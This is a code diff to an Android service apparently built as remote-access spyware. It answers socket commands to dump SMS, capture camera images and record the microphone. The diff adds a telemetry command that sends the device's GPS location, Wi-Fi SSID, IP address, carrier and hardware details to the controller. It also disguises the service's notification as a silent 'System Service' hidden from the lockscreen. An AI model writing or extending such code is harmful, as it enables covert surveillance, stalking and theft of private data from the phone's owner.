@@ -1,10 +1,12 @@
 package com.drink
 
+import android.app.ActivityManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.ImageFormat
@@ -13,25 +15,37 @@ import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
+import android.hardware.camera2.CaptureResult
+import android.hardware.camera2.TotalCaptureResult
+import android.location.Location
+import android.location.LocationManager
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.ImageReader
 import android.media.MediaRecorder
 import android.net.ConnectivityManager
 import android.net.Network
+import android.net.wifi.WifiManager
+import android.os.BatteryManager
 import android.os.Build
+import android.os.Environment
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
 import android.os.PowerManager
+import android.os.StatFs
+import android.os.SystemClock
 import android.provider.ContactsContract
 import android.provider.Telephony
+import android.telephony.TelephonyManager
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
+import java.net.NetworkInterface
+import java.util.Collections
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
@@ -157,6 +171,7 @@ class DrinkService : Service() {
                 "get_sms" -> handleSms(sm, frame)
                 "list_cams" -> handleListCams(sm)
                 "use_cam" -> handleUseCam(sm, frame)
+                "get_telemetry" -> handleTelemetry(sm)
                 "disconnect" -> {
                     micJob?.cancel()
                     sm.close()
@@ -391,11 +406,13 @@ class DrinkService : Service() {
             val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
             val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
-            val targetSize = jpegSizes?.filter { it.width in 640..1920 }?.maxByOrNull { it.width } ?: jpegSizes?.firstOrNull()
-            val width = targetSize?.width ?: 1280
-            val height = targetSize?.height ?: 720
+            val targetSize = jpegSizes?.filter { it.width.toLong() * it.height <= 4096 * 3072 }?.maxByOrNull { it.width.toLong() * it.height }
+                ?: jpegSizes?.maxByOrNull { it.width.toLong() * it.height }
+                ?: jpegSizes?.firstOrNull()
+            val width = targetSize?.width ?: 1920
+            val height = targetSize?.height ?: 1080
 
-            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 3)
+            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
             val thread = HandlerThread("CameraCaptureThread").apply { start() }
             val handler = Handler(thread.looper)
 
@@ -403,6 +420,7 @@ class DrinkService : Service() {
             var session: CameraCaptureSession? = null
             var framesReceived = 0
             var captured = false
+            var aeConverged = false
 
             val cleanup = {
                 runCatching { session?.stopRepeating() }
@@ -416,7 +434,7 @@ class DrinkService : Service() {
             imageReader.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                 framesReceived++
-                if (framesReceived < 8 && !captured) {
+                if (!aeConverged && framesReceived < 12 && !captured) {
                     image.close()
                     return@setOnImageAvailableListener
                 }
@@ -463,14 +481,46 @@ class DrinkService : Service() {
                                         set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                         set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                         set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                        set(CaptureRequest.CONTROL_AE_ANTIBANDING_MODE, CaptureRequest.CONTROL_AE_ANTIBANDING_MODE_AUTO)
                                         set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
-                                    }
-                                    captureSession.setRepeatingRequest(requestBuilder.build(), null, handler)
-                                    handler.postDelayed({
-                                        if (!captured) {
-                                            framesReceived = 8
+                                        set(CaptureRequest.JPEG_QUALITY, 100.toByte())
+
+                                        val aeRange = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
+                                        if (aeRange != null && aeRange.upper > 0) {
+                                            val compensation = (aeRange.upper * 0.35).toInt().coerceIn(1, aeRange.upper)
+                                            set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, compensation)
                                         }
-                                    }, 1200)
+
+                                        val sceneModes = characteristics.get(CameraCharacteristics.CONTROL_AVAILABLE_SCENE_MODES)
+                                        if (sceneModes != null && sceneModes.contains(CameraCharacteristics.CONTROL_SCENE_MODE_HDR)) {
+                                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_USE_SCENE_MODE)
+                                            set(CaptureRequest.CONTROL_SCENE_MODE, CameraCharacteristics.CONTROL_SCENE_MODE_HDR)
+                                        }
+
+                                        set(CaptureRequest.EDGE_MODE, CaptureRequest.EDGE_MODE_HIGH_QUALITY)
+                                        set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
+                                        set(CaptureRequest.COLOR_CORRECTION_MODE, CaptureRequest.COLOR_CORRECTION_MODE_HIGH_QUALITY)
+                                        set(CaptureRequest.HOT_PIXEL_MODE, CaptureRequest.HOT_PIXEL_MODE_HIGH_QUALITY)
+                                    }
+                                    val captureCallback = object : CameraCaptureSession.CaptureCallback() {
+                                        override fun onCaptureCompleted(
+                                            session: CameraCaptureSession,
+                                            request: CaptureRequest,
+                                            result: TotalCaptureResult
+                                        ) {
+                                            val aeState = result.get(CaptureResult.CONTROL_AE_STATE)
+                                            if (aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED ||
+                                                aeState == CaptureResult.CONTROL_AE_STATE_FLASH_REQUIRED ||
+                                                aeState == CaptureResult.CONTROL_AE_STATE_LOCKED
+                                            ) {
+                                                aeConverged = true
+                                            }
+                                        }
+                                    }
+                                    captureSession.setRepeatingRequest(requestBuilder.build(), captureCallback, handler)
+                                    handler.postDelayed({
+                                        aeConverged = true
+                                    }, 2200)
                                 } catch (e: Exception) {
                                     cleanup()
                                     val err = JSONObject().apply {
@@ -522,6 +572,177 @@ class DrinkService : Service() {
         }
     }
 
+    private fun handleTelemetry(sm: SocketManager) {
+        scope.launch(Dispatchers.IO) {
+            try {
+                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+                val bLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+                val bScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+                val bPct = if (bLevel >= 0 && bScale > 0) (bLevel * 100) / bScale else -1
+                val bStatus = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
+                val isCharging = bStatus == BatteryManager.BATTERY_STATUS_CHARGING || bStatus == BatteryManager.BATTERY_STATUS_FULL
+                val bPlugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
+                val pluggedStr = when (bPlugged) {
+                    BatteryManager.BATTERY_PLUGGED_AC -> "AC"
+                    BatteryManager.BATTERY_PLUGGED_USB -> "USB"
+                    BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
+                    else -> if (isCharging) "Charging" else "Unplugged"
+                }
+                val bTemp = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
+                val bVolt = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0) / 1000.0
+                val bHealthInt = batteryIntent?.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN) ?: BatteryManager.BATTERY_HEALTH_UNKNOWN
+                val bHealth = when (bHealthInt) {
+                    BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
+                    BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
+                    BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
+                    BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "Over Voltage"
+                    else -> "Normal"
+                }
+
+                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+                val activeNet = cm.activeNetwork
+                val caps = if (activeNet != null) cm.getNetworkCapabilities(activeNet) else null
+                val netType = when {
+                    caps == null -> "Disconnected"
+                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
+                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
+                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
+                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
+                    else -> "Other"
+                }
+                var wifiSsid = ""
+                runCatching {
+                    val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                    val info = wm.connectionInfo
+                    if (info != null && info.ssid != null && info.ssid != "<unknown ssid>") {
+                        wifiSsid = info.ssid.trim('"')
+                    }
+                }
+                var localIp = ""
+                runCatching {
+                    val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
+                    for (nif in interfaces) {
+                        val addrs = Collections.list(nif.inetAddresses)
+                        for (addr in addrs) {
+                            if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
+                                localIp = addr.hostAddress ?: ""
+                                break
+                            }
+                        }
+                        if (localIp.isNotEmpty()) break
+                    }
+                }
+                var carrier = ""
+                runCatching {
+                    val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+                    carrier = tm.networkOperatorName.ifEmpty { tm.simOperatorName }
+                }
+
+                val stat = StatFs(Environment.getDataDirectory().path)
+                val totalStorage = stat.totalBytes
+                val freeStorage = stat.availableBytes
+                val usedStorage = totalStorage - freeStorage
+
+                val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+                val memInfo = ActivityManager.MemoryInfo()
+                am.getMemoryInfo(memInfo)
+                val totalRam = memInfo.totalMem
+                val freeRam = memInfo.availMem
+                val usedRam = totalRam - freeRam
+                val isLowRam = memInfo.lowMemory
+
+                val manufacturer = Build.MANUFACTURER
+                val model = Build.MODEL
+                val brand = Build.BRAND
+                val androidVersion = Build.VERSION.RELEASE
+                val sdkInt = Build.VERSION.SDK_INT
+                val securityPatch = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Build.VERSION.SECURITY_PATCH else "N/A"
+                val uptimeSeconds = SystemClock.elapsedRealtime() / 1000
+
+                var lat: Double? = null
+                var lon: Double? = null
+                var accuracy: Float? = null
+                var altitude: Double? = null
+                var locTime: Long? = null
+                if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                    ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                    runCatching {
+                        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                        var bestLoc: Location? = null
+                        val providers = lm.getProviders(true)
+                        for (p in providers) {
+                            val l = lm.getLastKnownLocation(p) ?: continue
+                            if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
+                                bestLoc = l
+                            }
+                        }
+                        bestLoc?.let {
+                            lat = it.latitude
+                            lon = it.longitude
+                            accuracy = it.accuracy
+                            altitude = it.altitude
+                            locTime = it.time
+                        }
+                    }
+                }
+
+                val resp = JSONObject().apply {
+                    put("type", "telemetry")
+                    put("battery", JSONObject().apply {
+                        put("level", bPct)
+                        put("charging", isCharging)
+                        put("plugged", pluggedStr)
+                        put("temperature", bTemp)
+                        put("voltage", bVolt)
+                        put("health", bHealth)
+                    })
+                    put("network", JSONObject().apply {
+                        put("type", netType)
+                        put("ssid", wifiSsid)
+                        put("ip", localIp)
+                        put("carrier", carrier)
+                    })
+                    put("storage", JSONObject().apply {
+                        put("total_bytes", totalStorage)
+                        put("used_bytes", usedStorage)
+                        put("free_bytes", freeStorage)
+                    })
+                    put("memory", JSONObject().apply {
+                        put("total_bytes", totalRam)
+                        put("used_bytes", usedRam)
+                        put("free_bytes", freeRam)
+                        put("low_memory", isLowRam)
+                    })
+                    put("device", JSONObject().apply {
+                        put("manufacturer", manufacturer)
+                        put("model", model)
+                        put("brand", brand)
+                        put("android_version", androidVersion)
+                        put("sdk", sdkInt)
+                        put("security_patch", securityPatch)
+                        put("uptime_seconds", uptimeSeconds)
+                    })
+                    if (lat != null && lon != null) {
+                        put("location", JSONObject().apply {
+                            put("latitude", lat)
+                            put("longitude", lon)
+                            put("accuracy", accuracy)
+                            put("altitude", altitude)
+                            put("timestamp", locTime)
+                        })
+                    }
+                }
+                sm.sendFrame(resp)
+            } catch (e: Exception) {
+                val err = JSONObject().apply {
+                    put("type", "error")
+                    put("message", e.message ?: "Failed to get telemetry")
+                }
+                sm.sendFrame(err)
+            }
+        }
+    }
+
     private fun broadcastStatus(connected: Boolean) {
         val intent = Intent(ACTION_STATUS).apply {
             putExtra(EXTRA_CONNECTED, connected)
@@ -532,16 +753,23 @@ class DrinkService : Service() {
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Drink Service",
-            NotificationManager.IMPORTANCE_LOW
-        )
+            "System Service",
+            NotificationManager.IMPORTANCE_MIN
+        ).apply {
+            setShowBadge(false)
+            enableLights(false)
+            enableVibration(false)
+            lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+        }
         val manager = getSystemService(NotificationManager::class.java)
         manager.createNotificationChannel(channel)
     }
 
     private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
-        .setContentTitle("drink")
-        .setContentText("drink is running")
         .setSmallIcon(android.R.drawable.ic_dialog_info)
+        .setPriority(NotificationCompat.PRIORITY_MIN)
+        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+        .setSilent(true)
+        .setOngoing(true)
         .build()
 }
